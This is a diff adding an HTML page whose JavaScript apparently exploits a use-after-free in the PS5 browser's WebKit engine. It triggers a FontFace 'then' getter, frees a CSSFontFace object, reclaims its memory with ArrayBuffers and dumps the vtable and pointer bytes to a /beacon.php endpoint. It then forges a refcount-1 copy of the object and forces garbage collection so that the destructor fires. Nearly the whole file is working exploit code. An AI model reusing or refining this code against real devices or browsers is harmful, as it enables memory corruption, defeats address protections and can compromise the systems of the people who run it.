@@ -1,0 +1,419 @@
+<!DOCTYPE html><html><head><meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>P1222 GC destructor</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:#050508;color:#e8ffe8;font:13px/1.4 'Courier New',monospace;padding:10px}
+#s{font-size:18px;font-weight:bold;color:#ffd75e;padding:8px 0}
+#r{color:#ff55c8;white-space:pre-wrap;word-break:break-all;font-size:12px;line-height:1.6}
+</style>
+</head><body>
+<div id="s">P1222 BOOTING...</div>
+<div id="r"></div>
+<script>
+'use strict';
+/* ═══════════════════════════════════════════════════════════════════
+   P1222: GC-triggered CSSFontFace destructor
+
+   KEY INSIGHTS FROM P1221 + TEACHER:
+   1. .loaded ROOTS the FontFace wrapper → prevents GC
+   2. Without .loaded, FontFace IS collectable after delete+null
+   3. ArrayBuffer pressure hits bmalloc, NOT JS heap → wrong GC trigger
+   4. WeakRef + FinalizationRegistry work on PS5 14.10
+
+   PLAN:
+   Stage 1: Proven CSSFontFace reclaim (WITH .loaded on f0 — ok to root f0)
+            Read FULL 192 bytes including vtable area
+   Stage 2: Second reclaim WITHOUT .loaded on f1
+            PRESERVE all freed object bytes — only change refcount to 1
+            This keeps vtable, member pointers intact
+   Stage 3: Drop all refs to f1 wrapper, apply JS-HEAP pressure
+            Monitor refcount: 1→0 = destructor fired!
+   ═══════════════════════════════════════════════════════════════════ */
+
+var S=document.getElementById('s'),R=document.getElementById('r');
+function msg(t){R.textContent+=(R.textContent?'\n':'')+t;}
+
+function B(tag,data){
+  try{
+    var u='/beacon.php?tag=P1222-'+encodeURIComponent(tag);
+    if(data)u+='&data='+encodeURIComponent(String(data).slice(0,900));
+    u+='&t='+Date.now();
+    var x=new XMLHttpRequest();x.open('GET',u,false);x.send(null);
+  }catch(e){}
+}
+window.onerror=function(m,s,l){B('ERR',m+'@'+l);};
+
+function hex(v){return('0'+v.toString(16)).slice(-2);}
+
+B('START','gc-destructor');
+S.textContent='P1222: STAGE 1...';
+msg('=== P1222: GC destructor trigger ===');
+msg('');
+
+/* ═══════ STAGE 1: CSSFontFace reclaim — proven p563 pattern ═══════ */
+var K=8,SIZE=192;
+var s1data=null; /* full 192B snapshot of freed CSSFontFace */
+var leaked={p58:null,p68:null};
+
+var styleEl=document.createElement('style');
+styleEl.textContent="@font-face{font-family:s0;src:local(Arial);unicode-range:U+0042;}";
+document.head.appendChild(styleEl);
+var A0=new FontFace('f0','local(Helvetica)',{unicodeRange:'U+0041'});
+document.fonts.add(A0);
+void A0.loaded; /* OK to root f0 — we don't need to GC it */
+window.__alive=[A0];
+
+var firedS1=false;
+Object.defineProperty(FontFace.prototype,'then',{
+  configurable:true,
+  get:function(){
+    if(firedS1)return undefined;
+    firedS1=true;
+    if(styleEl)styleEl.remove();
+    try{document.fonts.delete(this);}catch(e){}
+    styleEl=null;
+    document.body.offsetHeight;
+    window.__map1=[];
+    for(var k=0;k<K;k++){
+      var ab=new ArrayBuffer(SIZE);
+      window.__map1.push({view:new Uint8Array(ab),bv:new BigUint64Array(ab)});
+    }
+    try{document.fonts.check('1em s0');}catch(e){}
+    return undefined;
+  },
+  set:function(){}
+});
+
+document.fonts.load('1em f0, s0','AB').then(function(){
+  B('S1-RESOLVED','ok');
+},function(){});
+
+setTimeout(function(){
+  var m=window.__map1;
+  if(!m||!m.length){B('S1-NOMAP','err');location.reload();return;}
+
+  var best=-1,nz=0;
+  for(var i=0;i<m.length;i++){
+    var v=m[i].view,n=0;
+    for(var j=0;j<v.length;j++)if(v[j]!==0)n++;
+    if(n>nz){nz=n;best=i;}
+  }
+
+  if(best<0){
+    B('S1-CLEAN','retry');
+    setTimeout(function(){location.reload();},300);
+    return;
+  }
+
+  /* Save FULL 192 bytes of the freed CSSFontFace */
+  s1data=new Uint8Array(SIZE);
+  for(var i=0;i<SIZE;i++)s1data[i]=m[best].view[i];
+
+  leaked.p58=[];leaked.p68=[];
+  for(var i=0;i<8;i++){leaked.p58.push(s1data[0x58+i]);leaked.p68.push(s1data[0x68+i]);}
+
+  /* Beacon the critical areas: vtable region (+0x00..+0x0F) and pointers */
+  var vtblHex='';
+  for(var i=0;i<16;i++)vtblHex+=hex(s1data[i]);
+  var p58hex='';for(var i=0;i<8;i++)p58hex+=hex(s1data[0x58+i]);
+  var p68hex='';for(var i=0;i<8;i++)p68hex+=hex(s1data[0x68+i]);
+
+  B('S1-HIT','b'+best+'|nz='+nz+'|vtbl='+vtblHex+'|p58='+p58hex+'|p68='+p68hex);
+  msg('S1 HIT buf'+best+' nz='+nz);
+  msg('vtable area: '+vtblHex);
+  msg('p58=0x'+p58hex+' p68=0x'+p68hex);
+
+  /* Beacon full first 128 bytes for analysis */
+  var dump1='';for(var i=0;i<64;i++)dump1+=hex(s1data[i]);
+  var dump2='';for(var i=64;i<128;i++)dump2+=hex(s1data[i]);
+  B('S1-DUMP-A',dump1);
+  B('S1-DUMP-B',dump2);
+
+  S.textContent='P1222: STAGE 2...';
+  setTimeout(runS2,200);
+},100);
+
+/* Fallback retry */
+setTimeout(function(){
+  if(!s1data){B('S1-TIMEOUT','retry');location.reload();}
+},3000);
+
+
+/* ═══════ STAGE 2: Second reclaim WITHOUT .loaded ═══════ */
+function runS2(){
+  B('S2-START','go');
+  msg('');msg('=== STAGE 2: Template (no .loaded) ===');
+
+  var styleEl2=document.createElement('style');
+  styleEl2.textContent="@font-face{font-family:s1;src:local(Arial);unicode-range:U+0043;}";
+  document.head.appendChild(styleEl2);
+
+  /* Create f1 WITHOUT accessing .loaded — critical for GC later! */
+  var A1=new FontFace('f1','local(Helvetica)',{unicodeRange:'U+0041'});
+  document.fonts.add(A1);
+  /* NO: void A1.loaded — this would root the wrapper! */
+
+  /* Set up WeakRef + FinReg BEFORE dropping the reference */
+  var weakA1=new WeakRef(A1);
+  var finRegFired=false;
+  var finReg=new FinalizationRegistry(function(tag){
+    finRegFired=true;
+    B('DESTRUCTOR-FIRED',tag);
+    msg('*** FinReg: '+tag+' ***');
+  });
+  finReg.register(A1,'f1-wrapper');
+
+  /* Store A1 temporarily for stage 2 setup */
+  window.__a1ref=A1;
+
+  var firedS2=false;
+  Object.defineProperty(FontFace.prototype,'then',{
+    configurable:true,
+    get:function(){
+      if(firedS2)return undefined;
+      firedS2=true;
+      if(styleEl2)styleEl2.remove();
+      try{document.fonts.delete(this);}catch(e){}
+      styleEl2=null;
+      document.body.offsetHeight;
+      window.__map2=[];
+      for(var k=0;k<K;k++){
+        var ab=new ArrayBuffer(SIZE);
+        var v=new Uint8Array(ab);
+        /* PRESERVE the full freed CSSFontFace layout from stage 1!
+           Only modify the refcount at +0x00 to 1.
+           This keeps the vtable and all member pointers intact. */
+        for(var j=0;j<SIZE;j++)v[j]=s1data[j];
+        /* Set refcount=1 (only the first 4 bytes, preserve +0x04..+0x07) */
+        v[0]=1;v[1]=0;v[2]=0;v[3]=0;
+        window.__map2.push({view:v,ab:ab,bv:new BigUint64Array(ab)});
+      }
+      try{document.fonts.check('1em s1');}catch(e){}
+      return undefined;
+    },
+    set:function(){}
+  });
+
+  document.fonts.load('1em f1, s1','AB').then(function(){
+    B('S2-RESOLVED','ok');
+
+    /* Find the template buffer (check refcount=1 and matching p58) */
+    var m2=window.__map2;
+    var tIdx=-1;
+    for(var i=0;i<m2.length;i++){
+      if(m2[i].view[0]===1){
+        var match=true;
+        for(var b=0;b<8;b++){
+          if(m2[i].view[0x58+b]!==s1data[0x58+b]){match=false;break;}
+        }
+        if(match){tIdx=i;break;}
+      }
+    }
+
+    if(tIdx<0){
+      /* Try finding ANY buffer with engine-written data */
+      for(var i=0;i<m2.length;i++){
+        var v=m2[i].view,nz=0;
+        for(var j=0;j<SIZE;j++)if(v[j]!==s1data[j])nz++;
+        if(nz>0){
+          tIdx=i;
+          B('S2-DIFF','buf'+i+'|diffs='+nz);
+          break;
+        }
+      }
+    }
+
+    if(tIdx<0){
+      B('S2-NOHIT','no-template');
+      /* Even if no reclaim hit, try the GC path anyway */
+      tIdx=0; /* use first buffer */
+      msg('S2: no reclaim hit, using buf0 as template');
+    }else{
+      B('S2-FOUND','buf'+tIdx);
+      msg('S2: template at buf'+tIdx);
+    }
+
+    /* Snapshot the template buffer */
+    var tv=m2[tIdx].view;
+    var snap=new Uint8Array(SIZE);
+    for(var i=0;i<SIZE;i++)snap[i]=tv[i];
+
+    /* Check if the engine overwrote any bytes (especially p58/p68 area) */
+    var s2p58='';for(var i=0;i<8;i++)s2p58+=hex(tv[0x58+i]);
+    var s2p68='';for(var i=0;i<8;i++)s2p68+=hex(tv[0x68+i]);
+    var s2vtbl='';for(var i=0;i<16;i++)s2vtbl+=hex(tv[i]);
+    B('S2-STATE','vtbl='+s2vtbl+'|p58='+s2p58+'|p68='+s2p68);
+    msg('S2 vtbl: '+s2vtbl);
+    msg('S2 p58: '+s2p58+' p68: '+s2p68);
+
+    /* ═══════ STAGE 3: GC trigger ═══════ */
+    setTimeout(function(){runS3(m2,tIdx,tv,snap,weakA1,finReg);},200);
+
+  },function(){B('S2-FAIL','rejected');});
+
+  /* If font.load doesn't trigger (no .loaded), try manual approach */
+  setTimeout(function(){
+    if(!firedS2){
+      B('S2-NOTRIGGERED','try-manual');
+      msg('S2: then-getter did not fire without .loaded!');
+      msg('trying manual load...');
+
+      /* Try: access .loaded on A1 to trigger loading, then immediately
+         resolve it. The local() font loads synchronously. */
+      var a1ref=window.__a1ref;
+      if(a1ref){
+        try{
+          a1ref.load(); /* explicit load call */
+          B('S2-MANUAL-LOAD','called');
+        }catch(e){
+          B('S2-MANUAL-ERR',e.message);
+        }
+      }
+    }
+  },1500);
+}
+
+
+/* ═══════ STAGE 3: GC-triggered destructor ═══════ */
+function runS3(m2,tIdx,tv,snap,weakA1,finReg){
+  B('S3-START','go');
+  S.textContent='P1222: STAGE 3 GC...';
+  msg('');msg('=== STAGE 3: GC destructor trigger ===');
+
+  /* Drop ALL JS references to the f1 wrapper */
+  window.__a1ref=null;
+
+  /* Remove from __alive if present */
+  if(window.__alive){
+    for(var i=window.__alive.length-1;i>=0;i--){
+      try{if(window.__alive[i].family==='f1')window.__alive.splice(i,1);}catch(e){}
+    }
+  }
+
+  /* Check WeakRef before GC */
+  var beforeAlive=weakA1.deref()!==undefined;
+  B('S3-BEFORE','alive='+beforeAlive);
+  msg('before GC: alive='+beforeAlive);
+
+  /* ─── JS-HEAP pressure (NOT ArrayBuffer!) ─── */
+  /* Teacher insight: ArrayBuffer backing stores go to bmalloc.
+     We need JS-heap objects to trigger the JS garbage collector. */
+
+  var gcWave=0;
+  var maxWaves=30;
+
+  function doJsHeapPressure(){
+    /* Create lots of JS objects that live on the JS heap */
+    var objects=[];
+    for(var i=0;i<5000;i++){
+      objects.push({
+        a:i,
+        b:'pressure_'+i+'_'+Math.random().toString(36),
+        c:[i,i+1,i+2],
+        d:function(){return i;},
+        e:new Map([[i,i+1]]),
+        f:Symbol('s'+i)
+      });
+    }
+    /* Create strings (JSString objects) */
+    for(var i=0;i<2000;i++){
+      objects.push('longstring_'+i+'_'.repeat(50)+Math.random());
+    }
+    /* Create closures */
+    for(var i=0;i<1000;i++){
+      objects.push((function(x){return function(){return x*2;};})(i));
+    }
+    /* Create Promises (microtask queue pressure) */
+    for(var i=0;i<500;i++){
+      objects.push(Promise.resolve(i));
+    }
+    /* Drop everything */
+    objects=null;
+
+    gcWave++;
+
+    /* Check after each wave */
+    var alive=weakA1.deref()!==undefined;
+
+    /* Check refcount in template buffer */
+    var rc=tv[0]|(tv[1]<<8)|(tv[2]<<16)|(tv[3]<<24);
+
+    /* Check for ANY byte changes in template */
+    var diffs=0;
+    var firstDiff='';
+    for(var i=0;i<SIZE;i++){
+      if(tv[i]!==snap[i]){
+        diffs++;
+        if(!firstDiff)firstDiff='+0x'+hex(i>>4)+hex(i&0xf)+'='+hex(snap[i])+'->'+hex(tv[i]);
+      }
+    }
+
+    if(!alive||diffs>0){
+      B('S3-EVENT','wave='+gcWave+'|alive='+alive+'|rc='+rc+'|diffs='+diffs+'|first='+firstDiff);
+      msg('WAVE '+gcWave+': alive='+alive+' rc='+rc+' diffs='+diffs+' '+firstDiff);
+    }
+
+    if(!alive){
+      /* WRAPPER COLLECTED! Check what happened to our buffer */
+      B('S3-COLLECTED','wave='+gcWave+'|rc='+rc+'|diffs='+diffs);
+      msg('*** WRAPPER COLLECTED at wave '+gcWave+'! ***');
+      msg('refcount='+rc+' buffer diffs='+diffs);
+
+      /* Full diff dump */
+      var allDiffs=[];
+      for(var i=0;i<SIZE;i++){
+        if(tv[i]!==snap[i])allDiffs.push('+0x'+hex(i>>4)+hex(i&0xf)+'='+hex(snap[i])+'->'+hex(tv[i]));
+      }
+      B('S3-DIFFS',allDiffs.join(',').slice(0,900));
+
+      /* Dump first 64 bytes of current buffer */
+      var curDump='';
+      for(var i=0;i<64;i++)curDump+=hex(tv[i]);
+      B('S3-POSTDUMP',curDump);
+
+      finalize();
+      return;
+    }
+
+    if(gcWave<maxWaves){
+      setTimeout(doJsHeapPressure,30);
+    }else{
+      /* Final state */
+      B('S3-TIMEOUT','waves='+maxWaves+'|alive='+alive+'|rc='+rc+'|diffs='+diffs);
+      msg('GC timeout after '+maxWaves+' waves. alive='+alive+' rc='+rc);
+
+      /* Extra attempt: create even more pressure */
+      msg('extra heavy GC...');
+      for(var round=0;round<5;round++){
+        var heavy=[];
+        for(var i=0;i<20000;i++){
+          heavy.push({x:i,y:'h'.repeat(100)+i,z:[i]});
+        }
+        heavy=null;
+      }
+
+      var finalAlive=weakA1.deref()!==undefined;
+      var finalRc=tv[0]|(tv[1]<<8)|(tv[2]<<16)|(tv[3]<<24);
+      var finalDiffs=0;
+      for(var i=0;i<SIZE;i++)if(tv[i]!==snap[i])finalDiffs++;
+      B('S3-EXTRAFINAL','alive='+finalAlive+'|rc='+finalRc+'|diffs='+finalDiffs);
+      msg('FINAL: alive='+finalAlive+' rc='+finalRc+' diffs='+finalDiffs);
+
+      finalize();
+    }
+  }
+
+  doJsHeapPressure();
+}
+
+function finalize(){
+  msg('');msg('=== P1222 COMPLETE ===');
+  S.textContent='P1222 COMPLETE';
+  B('DONE','all');
+}
+
+setTimeout(finalize,45000);
+</script>
+</body></html>
